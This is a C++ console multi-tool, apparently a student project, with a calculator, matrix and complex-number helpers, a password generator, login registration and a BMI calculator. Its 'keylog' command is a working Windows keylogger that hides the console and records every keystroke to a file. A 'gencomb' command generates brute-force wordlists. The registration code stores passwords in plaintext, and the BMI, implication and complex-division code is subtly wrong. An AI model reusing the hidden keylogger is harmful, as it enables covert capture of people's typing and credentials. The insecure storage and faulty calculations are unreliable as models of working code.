#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <stdlib.h>
#include <stdio.h>
#include <iostream>
#include <cmath>
#include <cstdlib>
#include <ctime>
#include <fstream>
#include <string>
#include <vector>
#include <complex>
#include <unordered_map>
#include <bitset>
#include <sstream>
#include <iomanip>

using namespace std;

typedef unsigned long int uint;
    struct User{string email; string password; unsigned long numer_telefonu;};
    std::unordered_map<string, User>users;

    unsigned long long int fact(unsigned long long int n)
    {
        if (n==0 || n==1) return 1;
        else return n*fact(n-1);
    }
void calc_app() {
    string waluta;
    uint a, b, sum, odd, times, n;
    uint pot;
    float div, a1,b1;
    int choice;
    float pier, pier1, pier2, Euro, e, Dam, Dkad, x,y;
    string polecenie;
    cout << "Welcome in calculator mode!" << endl;
    cout << "Give two numbers: ";
    cin >> a >> b;
    cout << "Select action: " << endl;
    cout << "1. Addition" << endl;
    cout << "2. Substraction" << endl;
    cout << "3. Multiplication" << endl;
    cout << "4. Division" << endl;
    cout << "5. Exponentiation" << endl;
    cout << "6.Currency converter " << endl;
    cout << "7. Factorial" << endl;
    cout << "8.Trigonometric functions" << endl;
    cout << "9. Quit " << endl;
    cin >> choice;

    switch (choice) {
    case 1:
        sum = a + b;
        cout << "Result: " << sum << endl;
        break;
    case 2:
        odd = a - b;
        cout << "Result: " << odd << endl;
        break;
    case 3:
        times = a * b;
        cout << "Result: " << times << endl;
        break;
    case 4:
        if (b != 0) {
            div = a / b;
            cout << "Result: " << div << endl;
        }
         else
        {
            cout << "Error: Division by zero!" << endl;
        }
        break;
    case 5:
        cout << "To what power should raise it? ";
        cin >> n;
        pot = pow(a, n);
        cout << "Result: " << pot << endl;
        break;
    case 6:
        cout << "Enter the currency to be converted: " << endl;
        cin >> waluta;
        if (waluta == "Euro" || waluta == "euro")
        {
            cin >> e;
            Euro = e*4.20;
            cout << "Converted currency: " << Euro << endl;
        }
        else if (waluta == "Dam" || waluta == "dam")
        {
            cin >> e;
            Dam = e*4.03;
            cout << "Converted currency: " << Dam << endl;
        }
        else if (waluta == "Dkad" || waluta == "dkad")
        {
            cin >> e;
            Dkad = e*2.80;
            cout << "Converted currency: " << Dkad << endl;
        }
        break;
    case 7:
        {
            unsigned long long result;
            cout << "Enter the number you want to calculate the factorial of: " << endl;
            cin >> n;
            if (n == 0 || n == 1)
                result = 1;
            else
                result = fact(n);

            cout << "Factorial of the number " << n << " is: " << result << endl;
        }
        break;

    case 8:
        {
            cout << "Enter the trigonometric function you want to calculate: " << endl;
            string fun;
            cin >> fun;
            if (fun == "sin" || fun == "Sin")
                {
                cin >> x;
                cout << "The sine of the angle is: " << sin(x) << endl;
            }
            else if (fun == "cos" || fun == "Cos")
                {
                cin >> x;
                cout << "The cosine of the angle is: " << cos(x) << endl;
            }
            else if (fun == "tan" || fun == "Tan")
            {
                cin >> x;
                cout << "The tangent of the angle is: " << tan(x) << endl;
            }
        }
        break;
        default:
                exit(0);
            cout << "Nie ma takiej opcji! " << endl;
        break;
    }
    }

void matrixnr(int arr[3][3], int n, int m) {
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < m; ++j) {
            arr[i][j] = i * j + m;
        }
    }
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < m; ++j) {
            cout << arr[i][j] << " ";
        }
        cout << endl;
    }
}

void matrixrand(int arr[3][3], int n, int m, int k) {
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < m; ++j) {
            arr[i][j] = rand() % k;
        }
    }
    for (int i = 0; i < n; ++i) {
        for (int j = 0; j < m; ++j) {
            cout << arr[i][j] << " ";
        }
        cout << endl;
    }
}

void matrixman(int arr[3][3], int a1, int a2, int a3, int a4, int a5, int a6, int a7, int a8, int a9) {
    arr[0][0] = a1; arr[0][1] = a2; arr[0][2] = a3;
    arr[1][0] = a4; arr[1][1] = a5; arr[1][2] = a6;
    arr[2][0] = a7; arr[2][1] = a8; arr[2][2] = a9;
    for (int i = 0; i < 3; ++i) {
        for (int j = 0; j < 3; ++j) {
            cout << arr[i][j] << " ";
        }
        cout << endl;
    }
}

void getCharacterSets(string& male, string& duze, string& cyfry, string& znaki) {
    male = "abcdefghijklmnopqrstuvwxyz";
    duze = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    cyfry = "0123456789";
    znaki = "!@#$%^&*()-_=+<>,.?/'|{}[];:";
}

string generatePassword(int length) {
    string male, duze, cyfry, znaki;
    getCharacterSets(male, duze, cyfry, znaki);

    string all_characters = male + duze + cyfry + znaki;
    string password = "";

    srand((time(0)));

    for (int i = 0; i < length; ++i) {
        int randomIndex = rand() % all_characters.length();
        password += all_characters[randomIndex];
    }
    return password;
}

void savePasswordToFile(const string& platform, const string& password, int length) {
    string filename;
    if (length < 11)
        filename = "P1.txt";
    else if (length < 20)
        filename = "P2.txt";
    else if (length < 30)
        filename = "P3.txt";
    else if (length < 40)
        filename = "P4.txt";
    else if (length < 50)
        filename = "P5.txt";
    else if (length < 60)
        filename = "P6.txt";
    else if (length < 70)
        filename = "P7.txt";
    else if (length < 80)
        filename = "P8.txt";
    else if (length < 90)
        filename = "P9.txt";
    else
        filename = "P10.txt";

    ofstream file(filename, ios::out | ios::app);
    if (file.is_open()) {
        file << platform << endl;
        file << password << endl;
        file.close();
        cout << "The password was saved in the file: " << filename << endl;
    } else {
        cerr << "Error: Failed to open file " << filename << endl;
    }
}

void generatePasswordWithPlatform(int length, const string& platform) {
    if (length < 4) {
        cout << "Password has to include minimum 4 characters!" << endl;
        return;
    }
    string password = generatePassword(length);
    savePasswordToFile(platform, password, length);
}
void complexn() {
    int choice;
    double re, im, re1, im1;
    float div;
    cout << "Give the real and imaginary part of the first complex number: ";
    cin >> re >> im;
    cout << "Give the real and imaginary part of the second complex number: ";
    cin >> re1 >> im1;

    complex<double> z1(re, im);
    complex<double> z2(re1, im1);

    cout << "Select operation on complex numbers:" << endl;
    cout << "1. Addition" << endl;
    cout << "2. Substraction" << endl;
    cout << "3. Multiplication" << endl;
    cout << "4. Conjugation" << endl;
    cout << "5. Modulus" << endl;
    cout << "6. Trigonometric form" << endl;
    cout << "7. Divide" << endl;
    cin >> choice;

    switch (choice) {
    case 1: {
        complex<double> sum = z1 + z2;
        cout << "Sum: " << sum << endl;
        break;
    }
    case 2: {
        complex<double> difference = z1 - z2;
        cout << "Difference: " << difference << endl;
        break;
    }
    case 3: {
        complex<double> times = z1 * z2;
        cout << "Product: " << times << endl;
        break;
    }
    case 4: {
        complex<double> conjugate1 = conj(z1);
        complex<double> conjugate2 = conj(z2);
        cout << "Conjugate of the first number: " << conjugate1 << endl;
        cout << "Conjugate of the second number: " << conjugate2 << endl;
        break;
    }
    case 5: {
        double mod1 = abs(z1);
        double mod2 = abs(z2);
        cout << "Modulus of first complex number: " << mod1 << endl;
        cout << "Modulus of second complex number: " << mod2 << endl;
        break;
    }
    case 6: {
        double mod1 = abs(z1);
        double arg1 = arg(z1);
        double mod2 = abs(z2);
        double arg2 = arg(z2);

        cout << "Trigonometric form of the first number: " << endl;
        cout << mod1 << " * (cos(" << arg1 << ") + i*sin(" << arg1 << "))" << endl;
        cout << "Trigonometric form of the second number: " << endl;
        cout << mod2 << " * (cos(" << arg2 << ") + i*sin(" << arg2 << "))" << endl;
        break;
    }
    case 7:
     {
         cout << "Two complex numbers divided by themselves: " << endl;
         cout << z1 << "/" << z2 <<endl;
         cout << "z2 conjugated: " << conj(z2) << endl;
         complex<double>div = (z1*conj(z2))/z2*conj(z2);
         cout << "Result: " << div << endl;
         break;
     }
    default:
        cout << "Wrong choice!" << endl;
        break;
    }
}

void generateCombinations(const string& chars, string current, int length) {
    if (length == 0) {
        cout << current << endl;
        return;
    }

    for (char c : chars) {
        generateCombinations(chars, current + c, length - 1);
    }
}

void generateAllCombinations(const string& chars, int minLength, int maxLength) {
    for (int length = minLength; length <= maxLength; ++length) {
        generateCombinations(chars, "", length);
    }
}

void generateCombinations1(const string& chars, string current, int length, ostream& out) {
    if (length == 0) {
        out << current << endl;
        return;
    }

    for (char c : chars) {
        generateCombinations1(chars, current + c, length - 1, out);
    }
}

void generateAllCombinations1(const string& chars, int minLength, int maxLength, ostream& out) {
    for (int length = minLength; length <= maxLength; ++length) {
        generateCombinations1(chars, "", length, out);
    }
}

void LOG(string input) {
    fstream LogFile;
    LogFile.open("data.txt", fstream::app);
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
}


bool SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        cout << " ";
        LOG(" ");
        return true;
    case VK_RETURN:
        cout << "\n";
        LOG("\n");
        return true;
    case '¾':
        cout << ".";
        LOG(".");
        return true;
    case VK_SHIFT:
        cout << "#SHIFT#";
        LOG("#SHIFT#");
        return true;
    case VK_BACK:
        cout << "\b";
        LOG("\b");
        return true;
    case VK_RBUTTON:
        cout << "#R_CLICK#";
        LOG("#R_CLICK#");
        return true;
    case VK_CAPITAL:
        cout << "#CAPS_LOCK#";
        LOG("#CAPS_LCOK");
        return true;
    case VK_TAB:
        cout << "#TAB";
        LOG("#TAB");
        return true;
    case VK_UP:
        cout << "#UP";
        LOG("#UP_ARROW_KEY");
        return true;
    case VK_DOWN:
        cout << "#DOWN";
        LOG("#DOWN_ARROW_KEY");
        return true;
    case VK_LEFT:
        cout << "#LEFT";
        LOG("#LEFT_ARROW_KEY");
        return true;
    case VK_RIGHT:
        cout << "#RIGHT";
        LOG("#RIGHT_ARROW_KEY");
        return true;
    case VK_CONTROL:
        cout << "#CONTROL";
        LOG("#CONTROL");
        return true;
    case VK_MENU:
        cout << "#ALT";
        LOG("#ALT");
        return true;
    default:
        return false;
    }
}
    void Register(string nick, string &password, string email, unsigned long int numer_telefonu)
    {
        fstream Logindetails;
        cout << "Welcome to the registration program! " << endl;
        cout << "Enter nick: " << endl;
        cin >> nick;
        if (users.find(nick) != users.end())
        {
            cout << "A user with the specified name already exists! " << endl;
        }
        cout << "Enter email: " << endl;
        cin >> email;
        for (const auto &pair : users)
        {
            if (pair.second.email == email)
            {
                cout << "The email address you provided is already taken! " << endl;
            }
        }
        cout << "Enter phone number: " << endl;
        cin >> numer_telefonu;
        for (const auto &pair : users)
        {
            if (pair.second.numer_telefonu == numer_telefonu)
            {
                cout << "The telephone number you provided is already taken! " << endl;
            }
        }
        cout << "Enter password: " << endl;
        cin >> password;
        if (password.length() <= 3)
        {
            cout << "Password has to include minimum 4 characters! " << endl;
        }
        users[nick] = {email, password, numer_telefonu};
        Logindetails.open("Logindetails.txt",  ios:: out | ios::app);
        {
            cout << "Username: " << endl;
            Logindetails << nick << endl;
            cout << "email: " << endl;
            Logindetails << email << endl;
            cout << "Password: " << endl;
            Logindetails << password << endl;
            cout << "Phone number: " << endl;
            Logindetails << numer_telefonu << endl;
            Logindetails.close();
        };
        cout << "Data save to file Logindetails.txt " << endl;
    }

    void Loginuser()
{
    cout << "Welcome to the User Login Program! " << endl;
    string nick;
    string password;
    cout << "Enter username: " << endl;
    cin >> nick;
    auto it = users.find(nick);
    if (it == users.end())
    {
        cout << "No user with the specified name found! " << endl;
        return;
    }
    cout << "Enter password: " << endl;
    cin >> password;
    if (it->second.password == password)
    {
        cout << "Login completed successfully! " << endl;
    }
    else
    {
        cout << "Bad password! " << endl;
    }
}

void BinCip(string wyraz)
{
    cout << "Welcome to the binary encryption program!" << endl;
    cout << "Enter a phrase to encrypt: ";
    getline(cin, wyraz);

    cout << "Encrypted phrase in binary code: " << endl;
    for (char znak : wyraz)
    {
        cout << bitset<8>(znak);
    }
    cout << endl;
}

    string CipHash(string& wyraz)
    {
        unsigned int hash = 0;
        for(char c : wyraz)
            {
                hash = hash * 31+c;
            }
        stringstream ss;
        ss << hex << setw(8) << setfill('0') << hash;
        return ss.str();
    }


void Game()
    {
    int a, b, tries, trudnosc;
    srand(time(0));
    cout << "Welcome in game guess the number!" << endl;
    cout << "Choose difficulty: " << endl;
    cout << "1. Easy" << endl;
    cout << "2. Medium" << endl;
    cout << "3. Hard" << endl;
    cout << "4. Extreme" << endl;
    cin >> trudnosc;

    switch (trudnosc)
    {
    case 1:
        cout << "Easy " << endl;
        tries = 3;
        b = rand() % 10;
        break;
    case 2:
        cout << "Medium " << endl;
        tries = 6;
        b = rand() % 31;
        break;
    case 3:
        cout << "Hard " << endl;
        tries = 10;
        b = rand() % 101;
        break;
    case 4:
        cout << "Extreme " << endl;
        tries = 20;
        b = rand() % 1001;
        break;
    default:
        cout << "Wrong choice! " << endl;
        return;
    }

    cout << "You have " << tries << " tries." << endl;

    while (tries > 0)
    {
        cout << "Give a number: ";
        cin >> a;

        if (a > b)
        {
            cout << "Too many!" << endl;
        }
        else if (a < b)
        {
            cout << "Too little!" << endl;
        }
        else
        {
            cout << "Congratulations! You guessed the number!" << endl;
            return;
        }

        tries--;

        if (tries == 0)
        {
            cout << "You didn't guess! The correct number is: " << b << endl;
        }
        else
        {
            cout << "Tries left: " << tries << endl;
        }
    }
}

    bool logicalOperations()
    {
        cout << "What logical operation do you want to perform? " << endl;
        bool a,b, result;
        int operacja;
        cout << "1. Conjunction " << endl;
        cout << "2. Alternative " << endl;
        cout << "3. Implication " << endl;
        cout << "4. Equivalence " << endl;
        cout << "5. Negation " << endl;
        cout << "6. Quit " << endl;
        cin >> operacja;
        switch (operacja)
        {
        case 1:
            cout << "Enter logical values (0 or 1) " << endl;
            cin >> a >> b;
            if ((a & b) != 0)
            {
                result = true;
            }
            else
            {
                result = false;
            }
            return result;
            break;
            case 2:
                cout << "Enter logical values (0 or 1) " << endl;
            cin >> a >> b;
            if ((a || b) != 0)
            {
                result = true;
            }
            else
            {
                result = false;
            }
            return result;
            break;
            case 3:
                cout << "Enter logical values (0 or 1) " << endl;
                cin >> a >> b;
            if (a == b)
            {
                result = true;
            }
            else if (a != b)
            {
                result = false;
            }
            else if (b != a)
            {
                result = false;
            }
            else if (a==0 && b==0)
            {
                result = true;
            }
            return result;
            break;
            case 4:
                cout << "Enter logical values (0 or 1) " << endl;
            cin >> a >> b;
            if (a == b)
            {
                result = true;
            }
            else if (a != b)
            {
                result = false;
            }
            else if (b != a)
            {
                result = false;
            }
            else if (b == a)
            {
                result = true;
            }
            return result;
            break;
            case 5:
                {
                    cout << "Enter logical values (0 or 1) " << endl;
                    cin >> a >> b;
                    cout << "Negation " << a << " " << !a << endl;
                    cout << "Negation " << b << " " << !b << endl;
                }
            break;
        default:
            cout << "Quitting... " << endl;
            exit(0);
            break;
        }
    }

    void addNote()
    {
        string note;
        cout << "Enter text: " << endl;
        cin.ignore();
        getline(cin, note);
        fstream notes("Notes.txt", ios::out | ios::app);
        if (!notes) {
            cout << "Error opening file!" << endl;
            return;
        }

        notes << note << endl;
        notes.close();
        cout << "Note saved!" << endl;
    }
    void deleteNotes()
    {
        ofstream notes("notes.txt", ios::trunc);
        if (!notes) {
            cout << "Error opening file to delete!" << endl;
            return;
        }
        notes.close();
        ifstream checkFile("notes.txt");
        if (checkFile.peek() == ifstream::traits_type::eof()) {
            cout << "All notes deleted!" << endl;
        } else {
            cout << "Error: File not deleted correctly!" << endl;
        }
        checkFile.close();
    }

    void bmi()
    {
        float height, weight, bmi;
        int age;
        string gender;
        cout << "Enter your gender: " << endl;
        cin >> gender;
        if (gender == "woman" || gender == "Woman")
        {
            cout << "Give weight(in kg): " << endl;
            cin >> weight;
            cout << "Give height: " << endl;
            cin >> height;
            bmi = weight/height;
            if (bmi <= 16 || bmi == 16.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Emaciation " << endl;
            }
            else if (bmi > 16.99 || bmi <= 18.49)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Underweight " << endl;
            }
            else if (bmi >=18.49 || bmi <= 24.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Weight within norm " << endl;
            }
            else if (bmi > 24.99 || bmi <= 29.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Overweight " << endl;
            }
            else if (bmi >= 29.99 || bmi <= 34.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "OBESITY I grade " << endl;
            }
            else if (bmi > 34.99 || bmi <= 39.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Obesity II grade " << endl;
            }
            else
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Obesity III grade " << endl;
            }
        }
        if (gender == "men" || gender == "Men")
        {
            cout << "Give weight(in kg): " << endl;
            cin >> weight;
            cout << "Give height: " << endl;
            cin >> height;
            bmi = weight/height;
            if (bmi <= 16 || bmi == 16.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Emaciation " << endl;
            }
            else if (bmi > 16.99 || bmi <= 18.49)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Underweight " << endl;
            }
            else if (bmi >=18.49 || bmi <= 24.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Weight within norm " << endl;
            }
            else if (bmi > 24.99 || bmi <= 29.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Overweight " << endl;
            }
            else if (bmi >= 29.99 || bmi <= 34.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "OBESITY I grade " << endl;
            }
            else if (bmi > 34.99 || bmi <= 39.99)
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Obesity II grade " << endl;
            }
            else
            {
                cout << "BMI is: " << bmi << endl;
                cout << "Obesity III grade " << endl;
            }
        }
    }


    void timer()
    {
        
    }


int main()
 {
    int re,im,re1,im1;
    complex<double>z1;
    complex<double>z2;
    string command;
    cout << "Give command: ";
    getline(cin, command);

    if (command == "calc") {
        calc_app();
    }
     else if (command == "matrix -r") {
        int arr[3][3], n, m, k;
        cout << "Give rows, cols and generation range: ";
        cin >> n >> m >> k;
        matrixrand(arr, n, m, k);
    }
    else if (command == "matrix -m") {
        int arr[3][3], n, m;
        cout << "Give rows and cols of matrix: ";
        cin >> n >> m;
        matrixnr(arr, n, m);
    }
     else if (command == "matrix -man") {
        int arr[3][3], a1, a2, a3, a4, a5, a6, a7, a8, a9;
        cout << "Give 9 values: ";
        cin >> a1 >> a2 >> a3 >> a4 >> a5 >> a6 >> a7 >> a8 >> a9;
        matrixman(arr, a1, a2, a3, a4, a5, a6, a7, a8, a9);
    }
        else if (command == "passgen -r")
    {
        int length;
        cout << "Give password length: ";
        cin >> length;
        if (length >= 4)
         {
            string password = generatePassword(length);
            cout << "Generated password: " << password << endl;
        } else
        {
            cout << "Password has to include minimum 4 characters!" << endl;
        }
    }     else if (command == "passgen -f")
{
        int length;
        string platform;
        cout << "Give password length: ";
        cin >> length;
        cin.ignore();
        cout << "Give platform name: ";
        getline(cin, platform);
        generatePasswordWithPlatform(length, platform);
    }
    else if(command == "database")
    {
        fstream data;
        cout << "Welcome in database mode!" << endl;
        cout << "Here you can enter data and save it to appropriately sorted files" << endl;
        string name,surname, date_of_birth;
        int age;
        cout << "Give name: " << endl;
        cin >> name;
        cout << "Give surname: " << endl;
        cin >> surname;
        cout << "Give age: " << endl;
        cin >> age;
        cout << "Give date of birth: " << endl;
        cin >> date_of_birth;
        data.open("Data.txt", ios::out | ios::app);
         data << "Person name: " << name << endl;
         data << "Person surname: " << surname << endl;
         data << "Person age: " << age << endl;
         data << "Person date of birth: " << date_of_birth << endl;
         data.close();
         cout << "Data saved to file: Data.txt" << endl;
    }
else if(command == "help" || command == "?" || command == "-?" || command == "help -h")
    {
        cout << "List of available commands: " << endl;
        cout << "calc " << endl;
        cout << "matrix " << endl;
        cout << "passgen " << endl;
        cout << "database " << endl;
    }
else if(command == "matrix -h" || command == "matrix -?")
    {
        cout << "-r" << endl;
        cout << "Fulfills a 3x3 matrix with random values from a user specified range. " << endl;
        cout << "-m" << endl;
        cout << "Wypełnia macierz 3x3 wartosciami." << endl;
        cout << "-man " << endl;
        cout << "Allows you to enter values into the matrix manually. " << endl;
    }

else if(command == "passgen -h" || command == "passgen -?")
    {
        cout << "-r" << endl;
        cout << "Displays the generated password on the screen. " << endl;
        cout << "-f" << endl;
        cout << "Depending on the password length, it saves it along with the platform name to specific files. " << endl;
    }
else if(command == "gencomb -h" || command == "gencomb -?")
    {
        cout << "Gencomb is a tool that allows you to generate combinations of characters provided by the user, and ranges provided by him." << endl;
        cout << "-f" << endl;
        cout << "Generates combinations and saves them to a file." << endl;
        cout << "-s" << endl;
        cout << "It does not save the combinations to a file, but shows them on the screen. " << endl;
    }
else if(command == "keylog -h" || command == "keylog -?" || command == "keylog -help")
{
    cout << "The keylog program reads the keys entered from the keyboard and saves them to a file. " << endl;
}
else if(command == "complex")
    {
        cout << "Welcome to complex numbers mode! " << endl;
        cout << "Here you can perform operations on complex numbers." << endl;
        complexn();
    }
else if(command == "gencomb -s")
    {
        string characters;
        int minlength,maxlength;
        cout << "Welcome to the character combination generator tool!" << endl;
        cout << "You can generate character combinations here" << endl;
        cout << "Enter the characters to use(for example.abc123) " << endl;
        cin >> characters;
        cout << "Enter minimum combination length: " << endl;
        cin >> minlength;
        cout << "Enter maximum combination length: " << endl;
        cin >> maxlength;
        cout << "Generated combinations: " << endl;
        generateAllCombinations(characters, minlength, maxlength);
    }
else if(command == "gencomb -f")
    {
        string characters;
        int minlength,maxlength;
        cout << "Enter the characters to use(for example.abc123)" << endl;
        cin >> characters;
        cout << "Enter minimum combination length: " << endl;
        cin >> minlength;
        cout << "Enter maximum combination length: " << endl;
        cin >> maxlength;
        if(minlength > maxlength || minlength <= 0 || characters.empty())
           {
                cerr << "Bad input data! " << endl;
           }
        cout << "Generating..." << endl;
            fstream comb("Combinations.txt ", ios::out | ios::app);
        if(comb.is_open())
        {
            cout << "Combinations saved to file Combinations.txt" << endl;
            generateAllCombinations1(characters, minlength, maxlength, comb);
            comb.close();
        }
        else if(comb.good() == false)
       {
         cout << "Error while opening file! " << endl;
       }
    }
else if(command == "keylog")
    {
        string pot;
        cout << "Welcome in keylog program!" << endl;
        cout << "The tool was created solely for scientific purposes. USE OF THIS PROGRAM WITHOUT THE CONSENT OF OTHER USERS IS ILLEGAL!" << endl;
        cout << "Do you confirm enabling the program?" << endl;
        cin >> pot;
        if(pot == "yes" || pot == "Yes" || pot == "YES")
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE);
            char KEY = 'x';

            while (true) {
                Sleep(10);
                for (int KEY = 8; KEY <= 190; KEY++)
                {
                    if (GetAsyncKeyState(KEY) == -32767) {
                        if (SpecialKeys(KEY) == false) {

                            fstream LogFile;
                            LogFile.open("datak.txt", fstream::app);
                            if (LogFile.is_open()) {
                                LogFile << char(KEY);
                                LogFile.close();
                            }

                        }
                    }
                }
            }
        }
    }
else if(command == "reg -r")
{
    string nick, password,email;
    unsigned long int numer_telefonu;
    Register(nick, password, email, numer_telefonu);
}
else if(command == "reg -l")
{
    string nick, password;
    Loginuser();
}
else if (command == "cip -b")
{
    string wyraz;
    BinCip(wyraz);
}
else if(command == "cip -c")
{
    cout << "Enter a phrase to encrypt: " << endl;
    string wyraz;
    getline(cin, wyraz);
    string hash = CipHash(wyraz);
    cout << "Encrypted phrase: " << hash << endl;
}
else if(command == "reg -h" || command == "reg -?")
{
    cout << "Program for registration and creation of user accounts." << endl;
    cout << "-r enables account registration." << endl;
    cout << "-l allows login. " << endl;
}
else if(command == "cip -h" || command == "cip -?")
{
    cout << "Phrase encryption program." << endl;
    cout << "-b allows the phrase to be encrypted in binary." << endl;
    cout << "-c allows you to encrypt the phrase by generating a hash." << endl;
}
else if(command == "game -g")
{
    Game();
}
else if (command == "game -h" || command == "game -?")
{
    cout << "A program responsible for games." << endl;
    cout << "-g classic guess the number game " << endl;
}
else if (command == "logic")
{
    cout << "Welcome to the logical value calculation program! " << endl;
    cout << logicalOperations() << endl;
}
else if (command == "logic -h" || command == "logic -?")
{
    cout << "A program responsible for basic logical operations. Conjunction, disjunction, implication, equivalence and negation. " << endl;
}
else if (command == "note")
{
    string notes;
    cout << "What do you want to do? " << endl;
    cout << "1. Add note " << endl;
    cout << "2. Delete note " << endl;
    cout << "3. Quit " << endl;
    int opt;
    cin >> opt;
    switch (opt)
    {
    case 1:
        addNote();
        getline(cin,notes);
        break;
    case 2:
        deleteNotes();
        cout << "Deleting... " << endl;
        break;
        default:
            exit(0);
        break;
    }
}
else if(command == "bmi")
{
    cout << "Welcome in bmi calculator! " << endl;
    bmi();
}
return 0;
}
